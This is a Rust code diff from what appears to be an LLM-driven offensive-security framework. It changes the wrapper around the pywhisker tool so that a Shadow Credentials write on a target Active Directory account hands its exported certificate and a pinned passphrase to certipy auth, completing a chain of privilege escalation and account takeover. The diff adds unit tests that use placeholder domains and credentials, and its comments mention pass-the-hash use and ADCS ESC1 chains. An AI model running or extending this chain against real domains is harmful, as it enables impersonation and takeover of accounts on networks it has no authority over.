@@ -256,6 +256,82 @@ pub fn build_gmsa_read_password_bloodyad(args: &Value) -> Result<CommandBuilder>
         .timeout_secs(60))
 }
 
+/// Passphrase applied to every PFX `pywhisker --action add` exports through
+/// this wrapper.
+///
+/// `pywhisker` always encrypts the PKCS#12 it writes, and mints a random
+/// 20-character passphrase when `--pfx-password` is absent. That random value
+/// only ever reaches stdout, so stage two (`certipy auth`) had nothing to open
+/// the file with and died on `Invalid password or PKCS12 data`. Pinning the
+/// value here makes the passphrase a property of the wrapper rather than of
+/// one tool invocation's output, which is what lets
+/// [`shadow_cred_pfx_password`] supply it without parsing anything.
+///
+/// It guards a self-signed key this operation just generated for itself, on
+/// the operator's own box — it is a file-format requirement, not a secret.
+pub const SHADOW_CRED_PFX_PASSPHRASE: &str = "ares-shadow-cred";
+
+/// Filename-stem prefix for every PFX this wrapper asks `pywhisker` to write.
+///
+/// Doubles as the provenance marker [`shadow_cred_pfx_password`] keys on: a
+/// PFX carrying this prefix was exported by [`build_pywhisker`] and therefore
+/// opens with [`SHADOW_CRED_PFX_PASSPHRASE`], while an ADCS-issued PFX from
+/// `certipy req` carries no passphrase at all and must be left alone.
+pub const SHADOW_CRED_PFX_PREFIX: &str = "ares_shadowcred_";
+
+/// True when `pfx_path` names a PFX this wrapper's `pywhisker` export produced.
+pub fn is_shadow_cred_pfx(pfx_path: &str) -> bool {
+    std::path::Path::new(pfx_path)
+        .file_name()
+        .and_then(|name| name.to_str())
+        .is_some_and(|name| name.starts_with(SHADOW_CRED_PFX_PREFIX))
+}
+
+/// Resolve the passphrase that opens `pfx_path`, or `None` when the file needs
+/// none.
+///
+/// An explicit `pfx_password` argument wins; otherwise a PFX named by
+/// [`build_pywhisker`] resolves to [`SHADOW_CRED_PFX_PASSPHRASE`]. Anything
+/// else — every `certipy req` output in the ADCS chains — resolves to `None`,
+/// because handing a passphrase to `certipy auth` for an unencrypted PKCS#12
+/// fails with the same `Invalid password or PKCS12 data` this exists to fix.
+pub fn shadow_cred_pfx_password<'a>(args: &'a Value, pfx_path: &str) -> Option<&'a str> {
+    if let Some(explicit) = optional_str(args, "pfx_password").filter(|s| !s.is_empty()) {
+        return Some(explicit);
+    }
+    if is_shadow_cred_pfx(pfx_path) {
+        return Some(SHADOW_CRED_PFX_PASSPHRASE);
+    }
+    None
+}
+
+/// Build the `--filename` stem `pywhisker` writes `<stem>.pfx`,
+/// `<stem>_cert.pem` and `<stem>_priv.pem` to.
+///
+/// Absolute (under the temp dir) so stage two resolves the path regardless of
+/// the working directory the second tool call runs in, prefixed so the export
+/// is recognisable as ours, and timestamped so two writes against the same
+/// principal never overwrite each other's key material.
+fn shadow_cred_pfx_stem(target_sam: &str) -> String {
+    let slug: String = target_sam
+        .chars()
+        .map(|c| {
+            if c.is_ascii_alphanumeric() {
+                c.to_ascii_lowercase()
+            } else {
+                '_'
+            }
+        })
+        .collect();
+    std::env::temp_dir()
+        .join(format!(
+            "{SHADOW_CRED_PFX_PREFIX}{slug}_{}",
+            crate::privesc::epoch_millis()
+        ))
+        .to_string_lossy()
+        .into_owned()
+}
+
 /// Manipulate msDS-KeyCredentialLink via `pywhisker.py`.
 ///
 /// Required args: `domain`, `username`, `dc_ip`, `target_samaccountname`
@@ -264,12 +340,19 @@ pub fn build_gmsa_read_password_bloodyad(args: &Value) -> Result<CommandBuilder>
 /// - `hash` — NTLM pass-the-hash (`--hashes :NTHASH`)
 /// - `password` — plaintext bind
 ///
-/// Optional args: `action` (default: `"add"`)
+/// Optional args: `action` (default: `"add"`), `filename` (PFX stem),
+/// `pfx_password` (passphrase for the exported PFX).
 ///
 /// Without the hash/Kerberos branches, DACL-holding machine accounts and
 /// captured NTLM-only principals can't drive Shadow Credentials writes even
 /// though the underlying `pywhisker.py` supports both auth modes — the LLM
 /// wrapper was the only bottleneck.
+///
+/// `action="add"` pins both the export path and its passphrase so
+/// [`crate::privesc::certipy_auth`] can open the result. Left to itself
+/// `pywhisker` picks a random 8-character stem in the current directory and a
+/// random 20-character passphrase, and stage two of the chain has no way to
+/// learn either.
 pub async fn pywhisker(args: &Value) -> Result<ToolOutput> {
     build_pywhisker(args)?.execute().await
 }
@@ -295,6 +378,19 @@ pub fn build_pywhisker(args: &Value) -> Result<CommandBuilder> {
     // teardown supplies it from the captured `device_id` hint.
     if let Some(device_id) = optional_str(args, "device_id").filter(|s| !s.is_empty()) {
         cmd = cmd.flag("--device-id", device_id);
+    }
+
+    if action == "add" {
+        let stem = optional_str(args, "filename")
+            .filter(|s| !s.is_empty())
+            .map(str::to_string)
+            .unwrap_or_else(|| shadow_cred_pfx_stem(target_sam));
+        let passphrase = optional_str(args, "pfx_password")
+            .filter(|s| !s.is_empty())
+            .unwrap_or(SHADOW_CRED_PFX_PASSPHRASE);
+        cmd = cmd
+            .flag_visible("--filename", stem)
+            .flag("--pfx-password", passphrase);
     }
 
     if let Some(tpath) = ticket_path {
@@ -1840,6 +1936,142 @@ mod tests {
             "target_samaccountname": "dc01$",
         });
         assert!(super::build_pywhisker(&args).is_err());
+    }
+
+    fn pywhisker_add_args(target: &str) -> serde_json::Value {
+        json!({
+            "domain": "contoso.local",
+            "username": "alice",
+            "password": "P@ssw0rd!",
+            "dc_ip": "192.168.58.10",
+            "target_samaccountname": target,
+        })
+    }
+
+    #[test]
+    fn pywhisker_add_pins_the_pfx_stem_and_passphrase() {
+        let cmd = super::build_pywhisker(&pywhisker_add_args("svc_sql")).unwrap();
+        let stem =
+            flag_value(cmd.args_for_test(), "--filename").expect("add must pin the export stem");
+        assert!(
+            std::path::Path::new(stem)
+                .file_name()
+                .and_then(|n| n.to_str())
+                .expect("stem has a file name")
+                .starts_with(super::SHADOW_CRED_PFX_PREFIX),
+            "stem {stem} must carry the provenance prefix"
+        );
+        assert!(
+            std::path::Path::new(stem).is_absolute(),
+            "stem {stem} must be absolute so stage two resolves it from any cwd"
+        );
+        assert_eq!(
+            flag_value(cmd.args_for_test(), "--pfx-password"),
+            Some(super::SHADOW_CRED_PFX_PASSPHRASE),
+            "without --pfx-password pywhisker mints a random passphrase only its \
+             stdout knows, and certipy auth cannot open the PFX"
+        );
+    }
+
+    #[test]
+    fn pywhisker_export_flags_are_add_only() {
+        for action in ["remove", "list"] {
+            let mut args = pywhisker_add_args("svc_sql");
+            args["action"] = json!(action);
+            args["device_id"] = json!("4b1c9f2a-1234-4a2b-9c3d-abcdef012345");
+            let cmd = super::build_pywhisker(&args).unwrap();
+            assert!(
+                flag_value(cmd.args_for_test(), "--filename").is_none(),
+                "{action}"
+            );
+            assert!(
+                flag_value(cmd.args_for_test(), "--pfx-password").is_none(),
+                "{action}"
+            );
+        }
+    }
+
+    #[test]
+    fn pywhisker_honours_an_explicit_stem_and_passphrase() {
+        let mut args = pywhisker_add_args("svc_sql");
+        args["filename"] = json!("/tmp/operator_chosen");
+        args["pfx_password"] = json!("OperatorChosen1!");
+        let cmd = super::build_pywhisker(&args).unwrap();
+        assert_eq!(
+            flag_value(cmd.args_for_test(), "--filename"),
+            Some("/tmp/operator_chosen")
+        );
+        assert_eq!(
+            flag_value(cmd.args_for_test(), "--pfx-password"),
+            Some("OperatorChosen1!")
+        );
+    }
+
+    #[test]
+    fn pywhisker_stem_survives_machine_account_and_path_characters() {
+        let cmd = super::build_pywhisker(&pywhisker_add_args("CONTOSO\\dc01$")).unwrap();
+        let stem = flag_value(cmd.args_for_test(), "--filename").unwrap();
+        let name = std::path::Path::new(stem)
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap();
+        assert!(name.starts_with(super::SHADOW_CRED_PFX_PREFIX));
+        assert!(
+            !name.contains('\\') && !name.contains('$'),
+            "target decoration must not leak into the path: {name}"
+        );
+    }
+
+    #[test]
+    fn the_stem_pywhisker_writes_resolves_back_to_the_passphrase() {
+        let cmd = super::build_pywhisker(&pywhisker_add_args("svc_sql")).unwrap();
+        let pfx = format!(
+            "{}.pfx",
+            flag_value(cmd.args_for_test(), "--filename").unwrap()
+        );
+        assert_eq!(
+            super::shadow_cred_pfx_password(&json!({}), &pfx),
+            Some(super::SHADOW_CRED_PFX_PASSPHRASE)
+        );
+    }
+
+    #[test]
+    fn shadow_cred_pfx_password_leaves_adcs_certificates_alone() {
+        for path in [
+            "/tmp/cert_ESC1_1754000000000.pfx",
+            "administrator.pfx",
+            "/tmp/ares_relay_abc/dc01.pfx",
+        ] {
+            assert_eq!(
+                super::shadow_cred_pfx_password(&json!({}), path),
+                None,
+                "{path}"
+            );
+            assert!(!super::is_shadow_cred_pfx(path), "{path}");
+        }
+    }
+
+    #[test]
+    fn shadow_cred_pfx_password_prefers_an_explicit_argument() {
+        let explicit = json!({ "pfx_password": "OperatorChosen1!" });
+        assert_eq!(
+            super::shadow_cred_pfx_password(&explicit, "/tmp/ares_shadowcred_svc_sql_1.pfx"),
+            Some("OperatorChosen1!")
+        );
+        assert_eq!(
+            super::shadow_cred_pfx_password(&explicit, "/tmp/cert_ESC1_1.pfx"),
+            Some("OperatorChosen1!")
+        );
+        let empty = json!({ "pfx_password": "" });
+        assert_eq!(
+            super::shadow_cred_pfx_password(&empty, "/tmp/ares_shadowcred_svc_sql_1.pfx"),
+            Some(super::SHADOW_CRED_PFX_PASSPHRASE),
+            "an empty argument is absent, not an empty passphrase"
+        );
+        assert_eq!(
+            super::shadow_cred_pfx_password(&empty, "/tmp/cert_ESC1_1.pfx"),
+            None
+        );
     }
 
     #[test]
